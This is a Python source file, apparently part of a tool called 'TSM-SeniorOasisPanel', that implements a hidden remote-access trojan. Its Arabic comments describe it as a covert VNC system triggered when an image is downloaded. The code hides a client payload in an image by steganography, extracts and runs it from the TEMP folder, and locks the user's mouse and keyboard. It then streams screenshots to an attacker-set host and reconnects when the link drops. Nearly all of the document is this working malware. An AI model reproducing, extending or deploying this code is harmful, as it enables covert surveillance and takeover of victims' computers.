#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Auto VNC System
نظام VNC تلقائي مخفي يعمل فوراً عند تنزيل الصورة
"""

import os
import sys
import time
import threading
import subprocess
import socket
import struct
import zlib
import base64
from PIL import Image, ImageGrab
import io
import ctypes
from ctypes import wintypes
import win32api
import win32con
import win32gui
import win32process
import win32security

class TSMInputBlocker:
    """نظام حجب إدخالات المستخدم مؤقتاً"""
    
    def __init__(self):
        self.blocked = False
        self.original_proc = None
        
    def block_user_input(self):
        """حجب إدخالات الماوس ولوحة المفاتيح"""
        try:
            if not self.blocked:
                # حجب إدخالات الماوس
                ctypes.windll.user32.BlockInput(True)
                self.blocked = True
                print("TSM-SeniorOasisPanel: User input blocked")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Input blocking error: {e}")
            return False
    
    def unblock_user_input(self):
        """إلغاء حجب إدخالات المستخدم"""
        try:
            if self.blocked:
                ctypes.windll.user32.BlockInput(False)
                self.blocked = False
                print("TSM-SeniorOasisPanel: User input unblocked")
                return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Input unblocking error: {e}")
            return False

class TSMAutoVNC:
    """نظام VNC تلقائي مخفي"""
    
    def __init__(self, server_host='localhost', server_port=5001):
        self.server_host = server_host
        self.server_port = server_port
        self.vnc_socket = None
        self.connected = False
        self.screen_sharing = False
        self.frame_rate = 15  # FPS عالي للتحكم السلس
        self.quality = 85  # جودة عالية
        self.input_blocker = TSMInputBlocker()
        self.hidden_mode = True
        self.auto_start = True
        
    def connect_to_vnc_server(self):
        """الاتصال بخادم VNC"""
        try:
            self.vnc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.vnc_socket.settimeout(10)
            self.vnc_socket.connect((self.server_host, self.server_port))
            self.connected = True
            print("TSM-SeniorOasisPanel: VNC connection established")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: VNC connection failed: {e}")
            return False
    
    def disconnect_vnc(self):
        """قطع الاتصال مع VNC"""
        try:
            if self.vnc_socket:
                self.vnc_socket.close()
            self.connected = False
            self.screen_sharing = False
            # إلغاء حجب الإدخالات عند قطع الاتصال
            self.input_blocker.unblock_user_input()
            print("TSM-SeniorOasisPanel: VNC disconnected")
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: VNC disconnect error: {e}")
    
    def capture_screen_high_quality(self):
        """التقاط الشاشة بجودة عالية"""
        try:
            # التقاط الشاشة
            screenshot = ImageGrab.grab()
            
            # ضبط الحجم للجودة المثلى
            screenshot = screenshot.resize((1920, 1080), Image.Resampling.LANCZOS)
            
            return screenshot
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Screen capture error: {e}")
            return None
    
    def compress_image_high_quality(self, image):
        """ضغط الصورة بجودة عالية"""
        try:
            if image.mode != 'RGB':
                image = image.convert('RGB')
            
            # ضغط JPEG بجودة عالية
            output = io.BytesIO()
            image.save(output, format='JPEG', quality=self.quality, optimize=True)
            compressed_data = output.getvalue()
            
            # ضغط إضافي مع zlib
            compressed_data = zlib.compress(compressed_data, 6)
            
            return compressed_data
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Image compression error: {e}")
            return None
    
    def send_screen_frame(self, image_data):
        """إرسال إطار الشاشة"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # إرسال رأس الإطار
            header = struct.pack('>I', len(image_data))
            self.vnc_socket.send(header)
            
            # إرسال بيانات الصورة المضغوطة
            self.vnc_socket.send(image_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Frame send error: {e}")
            return False
    
    def send_mouse_event(self, x, y, button, pressed):
        """إرسال أحداث الماوس"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # تنسيق حدث الماوس: نوع(1) + x(2) + y(2) + زر(1) + مضغوط(1)
            event_data = struct.pack('>BHHBB', 1, x, y, button, 1 if pressed else 0)
            self.vnc_socket.send(event_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Mouse event error: {e}")
            return False
    
    def send_keyboard_event(self, key_code, pressed):
        """إرسال أحداث لوحة المفاتيح"""
        try:
            if not self.connected or not self.vnc_socket:
                return False
            
            # تنسيق حدث لوحة المفاتيح: نوع(1) + كود المفتاح(2) + مضغوط(1)
            event_data = struct.pack('>BHB', 2, key_code, 1 if pressed else 0)
            self.vnc_socket.send(event_data)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Keyboard event error: {e}")
            return False
    
    def start_auto_vnc(self):
        """بدء VNC التلقائي"""
        if not self.connect_to_vnc_server():
            return False
        
        # حجب إدخالات المستخدم
        self.input_blocker.block_user_input()
        
        # بدء مشاركة الشاشة
        self.screen_sharing = True
        print("TSM-SeniorOasisPanel: Auto VNC started - Screen sharing active")
        
        # بدء حلقة مشاركة الشاشة
        sharing_thread = threading.Thread(target=self._auto_screen_sharing_loop, daemon=True)
        sharing_thread.start()
        
        return True
    
    def _auto_screen_sharing_loop(self):
        """حلقة مشاركة الشاشة التلقائية"""
        frame_delay = 1.0 / self.frame_rate
        
        while self.screen_sharing and self.connected:
            try:
                # التقاط الشاشة
                screenshot = self.capture_screen_high_quality()
                if screenshot is None:
                    time.sleep(frame_delay)
                    continue
                
                # ضغط الصورة
                compressed_data = self.compress_image_high_quality(screenshot)
                if compressed_data is None:
                    time.sleep(frame_delay)
                    continue
                
                # إرسال الإطار
                if not self.send_screen_frame(compressed_data):
                    break
                
                time.sleep(frame_delay)
                
            except Exception as e:
                print(f"TSM-SeniorOasisPanel: Auto screen sharing error: {e}")
                time.sleep(frame_delay)
    
    def stop_auto_vnc(self):
        """إيقاف VNC التلقائي"""
        self.screen_sharing = False
        self.input_blocker.unblock_user_input()
        self.disconnect_vnc()
        print("TSM-SeniorOasisPanel: Auto VNC stopped")

class TSMAutoLauncher:
    """مشغل تلقائي للـ VNC المخفي"""
    
    def __init__(self):
        self.auto_vnc = None
        self.running = False
        
    def extract_and_run_vnc(self, image_path, server_host='localhost', server_port=5001):
        """استخراج وتشغيل VNC من الصورة المخفية"""
        try:
            from TSM_ImageSteganography import TSMImageSteganography
            
            # إنشاء كائن التشفير
            stego = TSMImageSteganography()
            
            # استخراج العميل من الصورة
            temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), 'tsm_auto')
            os.makedirs(temp_dir, exist_ok=True)
            
            client_path = os.path.join(temp_dir, 'tsm_auto_client.py')
            
            if stego.extract_client_from_image(image_path, client_path):
                print("TSM-SeniorOasisPanel: Client extracted from image")
                
                # تحديث إعدادات العميل
                self._update_client_config(client_path, server_host, server_port)
                
                # تشغيل VNC التلقائي
                self.auto_vnc = TSMAutoVNC(server_host=server_host, server_port=server_port)
                
                if self.auto_vnc.start_auto_vnc():
                    self.running = True
                    print("TSM-SeniorOasisPanel: Auto VNC launched successfully")
                    return True
                else:
                    print("TSM-SeniorOasisPanel: Auto VNC launch failed")
                    return False
            else:
                print("TSM-SeniorOasisPanel: Client extraction failed")
                return False
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Auto launcher error: {e}")
            return False
    
    def _update_client_config(self, client_path, server_host, server_port):
        """تحديث إعدادات العميل"""
        try:
            with open(client_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # تحديث إعدادات الخادم
            content = content.replace(
                "self.host = 'localhost'",
                f"self.host = '{server_host}'"
            )
            content = content.replace(
                "self.port = 5000",
                f"self.port = {server_port}"
            )
            
            # إضافة VNC التلقائي
            vnc_code = '''
# ADDED: Auto VNC integration
from TSM_AutoVNC import TSMAutoVNC
auto_vnc = TSMAutoVNC(server_host='{}', server_port={})
auto_vnc.start_auto_vnc()
'''.format(server_host, server_port)
            
            content += vnc_code
            
            with open(client_path, 'w', encoding='utf-8') as f:
                f.write(content)
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Config update error: {e}")
    
    def monitor_connection(self):
        """مراقبة الاتصال"""
        while self.running:
            try:
                if self.auto_vnc and not self.auto_vnc.connected:
                    print("TSM-SeniorOasisPanel: Connection lost, attempting reconnection...")
                    if not self.auto_vnc.connect_to_vnc_server():
                        time.sleep(5)  # انتظار 5 ثواني قبل إعادة المحاولة
                time.sleep(10)  # فحص كل 10 ثواني
            except Exception as e:
                print(f"TSM-SeniorOasisPanel: Monitor error: {e}")
                time.sleep(10)
    
    def stop(self):
        """إيقاف المشغل التلقائي"""
        self.running = False
        if self.auto_vnc:
            self.auto_vnc.stop_auto_vnc()

def create_auto_vnc_image(image_path, output_path, server_host='localhost', server_port=5001):
    """إنشاء صورة مع VNC تلقائي مخفي"""
    try:
        from TSM_ImageSteganography import TSMImageSteganography
        
        # إنشاء كود VNC التلقائي
        auto_vnc_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import threading
from TSM_AutoVNC import TSMAutoVNC, TSMAutoLauncher

def main():
    # إعدادات الخادم
    server_host = '{server_host}'
    server_port = {server_port}
    
    # إنشاء مشغل VNC تلقائي
    launcher = TSMAutoLauncher()
    
    # استخراج وتشغيل VNC من الصورة الحالية
    current_image = __file__.replace('.py', '.png')
    if os.path.exists(current_image):
        launcher.extract_and_run_vnc(current_image, server_host, server_port)
        
        # مراقبة الاتصال
        launcher.monitor_connection()
    else:
        print("TSM-SeniorOasisPanel: Image file not found")

if __name__ == "__main__":
    main()
'''
        
        # حفظ كود VNC التلقائي
        auto_vnc_file = "TSM_AutoVNC_Client.py"
        with open(auto_vnc_file, 'w', encoding='utf-8') as f:
            f.write(auto_vnc_code)
        
        # تضمين الكود في الصورة
        stego = TSMImageSteganography()
        if stego.embed_client_in_image(image_path, auto_vnc_file, output_path):
            print(f"TSM-SeniorOasisPanel: Auto VNC image created: {output_path}")
            
            # تنظيف الملف المؤقت
            if os.path.exists(auto_vnc_file):
                os.remove(auto_vnc_file)
            
            return True
        else:
            print("TSM-SeniorOasisPanel: Auto VNC image creation failed")
            return False
            
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: Auto VNC image creation error: {e}")
        return False

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Create Auto VNC Image: python TSM_AutoVNC.py create <image> <output> [server_host] [server_port]")
        print("  Launch Auto VNC: python TSM_AutoVNC.py launch <image> [server_host] [server_port]")
        sys.exit(1)
    
    operation = sys.argv[1].lower()
    
    if operation == 'create':
        if len(sys.argv) < 4:
            print("Usage: python TSM_AutoVNC.py create <image> <output> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        output_path = sys.argv[3]
        server_host = sys.argv[4] if len(sys.argv) > 4 else 'localhost'
        server_port = int(sys.argv[5]) if len(sys.argv) > 5 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        create_auto_vnc_image(image_path, output_path, server_host, server_port)
    
    elif operation == 'launch':
        if len(sys.argv) < 3:
            print("Usage: python TSM_AutoVNC.py launch <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        launcher = TSMAutoLauncher()
        try:
            if launcher.extract_and_run_vnc(image_path, server_host, server_port):
                print("TSM-SeniorOasisPanel: Auto VNC launched successfully")
                print("TSM-SeniorOasisPanel: Press Ctrl+C to stop")
                
                # مراقبة الاتصال
                launcher.monitor_connection()
            else:
                print("TSM-SeniorOasisPanel: Auto VNC launch failed")
        except KeyboardInterrupt:
            launcher.stop()
            print("TSM-SeniorOasisPanel: Auto VNC stopped")
    
    else:
        print("Invalid operation. Use 'create' or 'launch'")
        sys.exit(1)

if __name__ == "__main__":
    main()
